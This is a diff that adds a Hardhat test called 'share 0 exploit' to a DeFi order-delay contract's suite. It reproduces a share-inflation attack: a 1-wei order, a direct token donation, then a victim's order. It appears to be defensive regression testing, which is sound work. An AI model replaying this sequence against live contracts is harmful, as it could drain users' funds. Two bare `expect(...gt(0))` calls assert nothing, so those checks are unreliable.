@@ -4,7 +4,7 @@ import { delayFixture, delayWithMaxTokenSupplyFixture } from '../shared/fixtures
 import { getDefaultSell, getOrderDigest, getSellOrderData } from '../shared/orders'
 import { OrderInternalType, OrderType } from '../shared/OrderType'
 import { setupFixtureLoader } from '../shared/setup'
-import { INVALID_ADDRESS, overrides } from '../shared/utilities'
+import { DELAY, INVALID_ADDRESS, expandTo18Decimals, getEventsFrom, increaseTime, overrides } from '../shared/utilities'
 
 describe('TwapDelay.sell', () => {
   const loadFixture = setupFixtureLoader()
@@ -259,5 +259,59 @@ describe('TwapDelay.sell', () => {
     )
       .to.emit(orderIdTest, 'OrderId')
       .withArgs(1)
+  })
+
+  it('share 0 exploit', async () => {
+    const {
+      factory,
+      delay,
+      pair,
+      addLiquidity,
+      token0,
+      token1,
+      wallet,
+      other: hacker,
+      another: victim,
+    } = await loadFixture(delayFixture)
+    await factory.setSwapFee(token0.address, token1.address, 0, overrides)
+    await addLiquidity(expandTo18Decimals(3000), expandTo18Decimals(3000))
+    await token0.transfer(hacker.address, expandTo18Decimals(30000), overrides)
+    await token0.transfer(victim.address, expandTo18Decimals(30000), overrides)
+    await token0.connect(hacker).approve(delay.address, constants.MaxUint256, overrides)
+    await token0.connect(victim).approve(delay.address, constants.MaxUint256, overrides)
+    const gasPrice = await delay.gasPrice()
+
+    const sellRequestHacker = getDefaultSell(token0, token1, hacker)
+    sellRequestHacker.amountIn = BigNumber.from(1)
+    // sellRequestHacker.amountIn = BigNumber.from(expandTo18Decimals(1000))
+    const txHacker = await delay
+      .connect(hacker)
+      .sell(sellRequestHacker, { ...overrides, value: gasPrice.mul(sellRequestHacker.gasLimit) })
+    const receiptTxHacker = await txHacker.wait()
+    const orderDataHacker = getSellOrderData(receiptTxHacker)
+
+    const amountToSteal = expandTo18Decimals(1000)
+    await token0.connect(hacker).transfer(delay.address, amountToSteal)
+
+    const sellRequestVictim = getDefaultSell(token0, token1, victim)
+    sellRequestVictim.amountIn = amountToSteal
+    const txVictim = await delay
+      .connect(victim)
+      .sell(sellRequestVictim, { ...overrides, value: gasPrice.mul(sellRequestVictim.gasLimit) })
+    const receiptTxVictim = await txVictim.wait()
+    const orderDataVictim = getSellOrderData(receiptTxVictim)
+    expect(BigNumber.from(orderDataVictim[0].value0).gt(0))
+
+    const orderData = orderDataHacker.concat(orderDataVictim)
+    await increaseTime(wallet, DELAY + 1)
+    const tx = await delay.execute(orderData, overrides)
+
+    const swapEvents = await getEventsFrom(pair, tx, 'Swap')
+    const parsedSwapEvents = swapEvents.map((e) => pair.interface.parseLog({ topics: e.topics, data: e.data }))
+    for (const event of parsedSwapEvents) {
+      expect(event.args['amount0In'].mul(2)).to.eq(event.args['amount1Out'])
+    }
+
+    expect((await token1.balanceOf(victim.address)).gt(0))
   })
 })
